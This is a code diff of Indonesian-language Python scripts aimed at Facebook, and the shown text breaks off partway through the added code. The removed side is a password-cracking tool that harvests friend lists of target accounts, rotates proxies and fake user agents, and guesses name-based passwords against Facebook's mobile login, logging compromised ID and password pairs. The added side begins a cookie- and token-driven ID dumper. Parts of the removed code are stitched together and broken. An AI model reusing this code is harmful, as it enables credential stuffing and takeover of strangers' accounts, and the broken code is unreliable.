@@ -1,507 +1,967 @@
-#-----------------[ IMPORT-KONTOL ]-----------------------#
-###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
-import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from datetime import date,datetime
-from time import sleep
-ses = requests.Session()
-device = platform.platform()
+#--> Author
+Author = 'Dapunta Khurayra X'
+Version = 0.1
+Facebook = 'Facebook.com/Dapunta.Khurayra.X'
+Instagram = 'Instagram.com/ratya.anonym.id'
 
-###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
-from rich.console import Console
-from rich.table import Table
-from rich.columns import Columns
-console = Console()
+#--> Import Module
+import os, sys, requests, bs4, re, time, datetime, random
+from bs4 import BeautifulSoup as bs
 
-###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
-#from src import login as Login
-#from src import dump as Dump
-#from src import lain as Lain
-
-###----------[ COLOR FOR PRINT ]---------- ###
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'	# WARNA MATI
-
-###----------[ COLOR FOR RICH ]---------- ###
-Z2 = "[#000000]" # HITAM
-M2 = "[#FF0000]" # MERAH
-H2 = "[#00FF00]" # HIJAU
-K2 = "[#FFFF00]" # KUNING
-B2 = "[#00C8FF]" # BIRU
-U2 = "[#AF00FF]" # UNGU
-N2 = "[#FF00FF]" # PINK
-O2 = "[#00FFFF]" # BIRU MUDA
-P2 = "[#FFFFFF]" # PUTIH
-J2 = "[#FF8F00]" # JINGGA
-A2 = "[#AAAAAA]" # ABU-ABU
-
-###----------[ GLOBAL NAME ]---------- ###
-ses = requests.Session()
-reset = "[/]"
-IP = requests.get("http://ip-api.com/json/").json()["query"]
-negara = requests.get("http://ip-api.com/json/").json()["country"]
-zxc = "fbkey"
-ff = "fall"
-xv = "xavier"
-
-###----------[ APPEND AND MORE ]---------- ###
-loop = 0
-id,id2,ok,cp = [],[],[],[]
-mtd_dev = []
-opt = []
-idz = []
-apk = []
-files = []
-id_groups = []
-data = {}
-ugent1, ugent2 = [],[]
-datt = []
-###----------[ CHECK STATUS SCRIPT ]---------- ###
-try:
-	info = ses.get("https://raw.githubusercontent.com/mrxvaau/MBF/main/info.txt").text
-	if "maintenance" in info:
-		prints(Panel(f"""{P2}Sorry, the script is currently under maintenance, please wait until it finishes updating. thanks you<3""",width=80,style=f"{color_table}"))
-		sys.exit()
-except requests.exceptions.ConnectionError:
-	prints(Panel(f"""{P2}connection problem, please check your connection again""",width=80,style=f"{color_table}"))
-	sys.exit()
-	
-###----------[ CHECK THEME COLOR ]---------- ###
-try:
-	color_rich = open("data/color_rich.txt","r").read()
-except FileNotFoundError:
-	color_rich = "[#00C8FF]"
-try:
-	color_table = open("data/color_table.txt","r").read()
-except FileNotFoundError:
-	color_table = "#00C8FF"
-
-###----------[ CLEAR TERMINAL ]---------- ###
-def clear_screen():
-	if "linux" in sys.platform.lower():
-		try:os.system("clear")
-		except:pass
-	elif "win" in sys.platform.lower():
-		try:os.system("cls")
-		except:pass
-	else:
-		try:os.system("clear")
-		except:pass
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
-from rich.progress import SpinnerColumn
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-pretty.install()
-CON=sol()
-#------------------[ USER-AGENT-PROXY ]-------------------#
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
-    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-    open('.proxy.txt','w').write(prox)
-except Exception as e:
-    exit(e)
-for xd in range(10000):
-    a='Mozilla/5.0 (Linux; Android 12;'
-    b=random.randrange(1, 9)
-    c=random.randrange(1, 9)
-    d='SAMSUNG SM-G986U)'
-    e=random.randrange(100, 9999)
-    f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104'
-    g=random.randrange(1, 9)
-    h=random.randrange(1, 4)
-    i=random.randrange(1, 4)
-    j=random.randrange(1, 4)
-    k='Mobile Safari/537.36'
-    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-    ugen2.append(uaku)
-
-    aa='Mozilla/5.0 (Linux; U; Android 9; th-TH;'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c='ASUS_Z01QD Build/PKQ1.190101.001)'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-for x in range(10):
-	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-	b=random.randrange(100, 9999)
-	c=random.randrange(100, 9999)
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
-	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-	ugen.append(uak)
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua : 
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-ua = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
-'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
-'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
-'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
-'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
-
-#------------[ INDICATION ]---------------#
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
-pwpluss,pwnya=[],[]
-#------------[ WARNA-MEMEKMU]--------------#
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
-#--------------------[ CONVERTER-BULAN ]--------------#
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-#------------------[ MACHINE-SUPPORT ]---------------#
-def jalan(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+#--> Clear Terminal
 def clear():
-	os.system('clear')
-def back():
-	login()
- 
-def banner():	
-	print(f"""{u} _______  ______ _______ _______ _     _
- |       |_____/ |_____| |       |____/ 
- |_____  |    \_ |     | |_____  |    \_""")
+    if "linux" in sys.platform.lower():os.system("clear")
+    elif "win" in sys.platform.lower():os.system("cls")
 
-jalan(f'({H}+{P})simple crak')
-#--------------------[ BAGIAN-MASUK ]--------------
+#--> Tanggal
+skrng = datetime.datetime.now()
+tahun, bulan, hari = skrng.year, skrng.month, skrng.day
+bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
+tanggal = ("%s-%s-%s"%(hari,bulan_cek[bulan-1],tahun))
 
-#--------------------[ MASUK ]--------------#
-def login():
-	try:
-		token = open('token.txt','r').read()
-		cok = open('cok.txt','r').read()
-		tokenku.append(token)
-		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
-			sy3 = json.loads(sy.text)['id']
-			menu(sy2,sy3)
-		except KeyError:
-			login_lagi334()
-		except requests.exceptions.ConnectionError:
-			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
-			exit()
-	except IOError:
-		login_lagi334()
-def login_lagi334():
-	try:
-		os.system('clear')
-		banner()
-		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'Enter Cookies :{H} ')
-		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
-		find_token = re.search("(EAAG\w+)", data.text)
-		ken=open("token.txt", "w").write(find_token.group(1))
-		cok=open("cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL ');time.sleep(1)
-		os.system('python fbi.py')
-#		exit()
-	except Exception as e:
-		os.system("rm -f token.txt")
-		os.system("rm -f cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
-		exit()
-#------------------[ BAGIAN-MENU ]----------------#
-def menu(my_name,my_id):
-	try:
-		token = open('token.txt','r').read()
-		cok = open('cok.txt','r').read()
-	except IOError:
-		print('[×] Expired Cookies ')
-		time.sleep(5)
-		login_lagi334()
-	os.system('clear')
-	banner()
-	ip = requests.get("https://api.ipify.org").text
-	
-	prints(Panel(f"{H2}",padding=(0,30),title=f"{H2}Select the script menu",subtitle=f"",style=f"{color_table}"))
-	print(f'{P}[{B}01{P}]:CRAK PUBLIK{H}(ON)\n{P}[{B}02{P}]:check results crak{M}(OFF)\n{P}[{B}00{P}]:OUT')
-	poko = input(f'[{B}*{P}]select:')
-	if poko in ['1']:
-		craker()
-	elif ridwan-xd223 in ['0']:
-		os.system('rm -rf token.txt')
-		os.system('rm -rf cookie.txt')
-		print('👉Successfully Logout+Delete Cookies ')
-		exit() 
-#-----------------[ HASIL-CRACK ]-----------------#
+#--> Waktu Jalannya Program
+def start():
+    global Mulai_Jalan
+    Mulai_Jalan = datetime.datetime.now()
+def finish():
+    global Akhir_Jalan, Total_Waktu
+    Akhir_Jalan = datetime.datetime.now()
+    Total_Waktu = Akhir_Jalan - Mulai_Jalan
+    try:
+        Menit = str(Total_Waktu).split(':')[1]
+        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
+        print('\nProgram Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
+    except Exception as e:
+        print('\nProgram Selesai Dalam Waktu 0 Detik\n')
 
-#-------------------[ CRACK-PUBLIK ]----------------#
-def craker():
-	try:
-		token = open('token.txt','r').read()
-		cok = open('cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		jum = int(input(f'[{B}*{P}]input target amount: '))
-	except ValueError:
-		print('👉wrong input ')
-		exit()
-	if jum<1 or jum>100:
-		print('👉 Failed Dump Id not public ')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(f'[{B}*{P}] Enter id  '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('unstable signal ')
-			exit()
-	try:
-		print(f'id celection{asu}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{x}')
-		print('👉unstable signal ')
-		back()
-	except (KeyError,IOError):
-		print(f'{k} Friendship Not Public {x}')
-		time.sleep(3)
-		back()
-#-------------[ PENGATURAN-IDZ ]---------------#
-def setting():
-	
-	prints(Panel(f"{P2}SIMPLE",padding=(0,30),title=f"{H2}id order setting crak",subtitle=f"",style=f"{color_table}"))
-	print(f'{P}1.  Id Old To New{M} (Not Recommend\n{P}2.  Id New To Old{H} (Recommend)\n{P}3.  Id Random{K} (Very Recommend')
-	hu = input('Pilih : ')
-	if hu in ['1','01']:
-		for tua in sorted(id):
-			id2.append(tua)
-			
-	elif hu in ['2','02']:
-		muda=[]
-		for bacot in sorted(id):
-			muda.append(bacot)
-		bcm=len(muda)
-		bcmi=(bcm-1)
-		for xmud in range(bcm):
-			id2.append(muda[bcmi])
-			bcmi -=1
-	elif hu in ['3','03']:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	else:
-		print('input correctly ')
-		exit()
-		print('')		
-	print('')
-	
-	prints(Panel(f"{P2}choose metode",padding=(0,30),title=f"{P2}metode menu",subtitle=f"{H2}simple",style=f"{color_table}"))
-	print(f'''{x}1. login from{B} m.facebok.com {P}(slow)''')
-	cetak(nel(f'[green]Notes:   choose the login methode'))
-	print('')
-	hc = input('Chouse : ')
-	if hc in ['1','01']:
-		method.append('mobile')
-#	else:
-		method.append('mobile')
-		cetak(nel('[green]Default Password In this script only fullname+nama1234 Recommended to use anadditional password'))
-	pwplus=input('add pasword manual y/t : ')
-	if pwplus in ['y','Y']:
-		pwpluss.append('ya')
-		cetak('Masukkan kata sandi tambahan minimal 6 karakter\nContoh :[green] Indonesia,rahasia,katasandi[white] ')
-		pwku=input('Enter Additional Password : ')
-		pwkuh=pwku.split(',')
-		for xpw in pwkuh:
-			pwnya.append(xpw)
-	else:
-		pwpluss.append('no')
-	passwrd()
-	jalan('#' * 40)
-#-------------------[ BAGIAN-WORDLIST ]------------#
-def passwrd():
-	global prog,des
-	print(f'└─ Play Airplane Mode Every {m}500 ID\n')
-#	os.system('clear')
-	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
-	with prog:
-		with tred(max_workers=30) as pool:
-			for yuzong in id2:
-				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-				frs = nmf.split(' ')[0]
-				pwv = []
-				if len(nmf)<6:
-					if len(frs)<3:
-						pass
-						
-				else:
-					if len(frs)<3:
-						pwv.append(nmf)
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-				if 'ya' in pwpluss:
-					for xpwd in pwnya:
-						pwv.append(xpwd)
-				else:pass
-				if 'mobile' in method:
-					pool.submit(crack,idf,pwv)
-				else:
-					pool.submit(crack,idf,pwv)
-		print('')
-		cetak('\t[cyan]└─[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
-		print(f'{h} OK : {h}%s '%(ok))
-		print(f'{k} CP : {k}%s{x} '%(cp))
-		print('')
-		print('└─ Do You Want User Checkpoint Detector ( Y/t ) ? ')
-		woi = input('└─ Select : ')
-		if woi in ['y','Y']:
-			cek_opsi()
-		else:
-			print(f'\t{x}└─{k} Good Bye Thanks To Using My Script {x} << ')
-			time.sleep(2)
-			back()
-#--------------------[ METODE-MOBILE ]-----------------#
-def crack(idf,pwv):
-	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'{K}RESULTS {cpc}')
-				print(f'\r├──{K}{idf}|{pw}    \n{M}{ua}           \n')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'{H}RESULTS {okc}')
-				print(f'\r├── {H}{idf}{pw} \n{P}└── {H}{kuki}\n{H}{ua}{P}\n')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				cek_apk(session,coki)
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-def Selamat():
-    print("")
+#--> Animasi
+def animasi():
+    print('\rSedang Dump %s ID'%(str(len(dump))),end=''); sys.stdout.flush()
+
+#--> Global Variable
+pemisah = '|'
+
+#--> Ubah Bahasa
+def language(cookie):
+    try:
+        with requests.Session() as xyz:
+            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
+            pra = bs(req.content,'html.parser')
+            for x in pra.find_all('form',{'method':'post'}):
+                if 'Bahasa Indonesia' in str(x):
+                    bahasa = {
+                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
+                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
+                        "submit"  : "Bahasa Indonesia"}
+                    url = 'https://mbasic.facebook.com' + x['action']
+                    exec = xyz.post(url,data=bahasa,cookies=cookie)
+    except Exception as e:pass
+
+#--> Convert
+def user_to_id(username):
+    try:
+        req = bs(requests.Session().get('https://mbasic.facebook.com/%s'%(username), cookies={'cookie':open('login/cookie.json','r').read()}).content, 'html.parser')
+        kut = req.find('a',string='Lainnya')
+        id = str(kut['href']).split('=')[1].split('&')[0]
+        # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
+        return(id)
+    except Exception as e:return(username)
+def group_to_id(username):
+    try:
+        req = bs(requests.Session().get('https://mbasic.facebook.com/groups/%s'%(username), cookies={'cookie':open('login/cookie.json','r').read()}).content, 'html.parser')
+        kut = req.find('a',string='Lihat Postingan Lainnya')
+        id = str(kut['href']).split('?')[0].split('/')[2]
+        return(id)
+    except Exception as e:return(username)
+
+#--> Logo
+def logo():
+    print('.___________                                     ')
+    print('|   \______ \  __ __  _____ ______   ___________ ')
+    print('|   ||    |  \|  |  \/     \\\____ \_/ __ \_  __ \\')
+    print('|   ||    `   \  |  /  Y Y  \  |_> >  ___/|  | \/')
+    print('|___/_______  /____/|__|_|  /   __/ \___  >__|   ')
+    print('            \/  Facebook  \/|__|        \/       \n')
+
+#--> Login
+class login:
+    def __init__(self):
+        self.xyz = requests.Session()
+        self.cek_cookies()
+        main_menu()
+    def cek_cookies(self):
+        try:
+            self.cookie     = {'cookie':open('login/cookie.json','r').read()}
+            self.token_eaag = open('login/token_eaag.json','r').read()
+            self.token_eaab = open('login/token_eaab.json','r').read()
+            self.token_eaaj = open('login/token_eaaj.json','r').read()
+            language(self.cookie)
+            req1 = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['name']
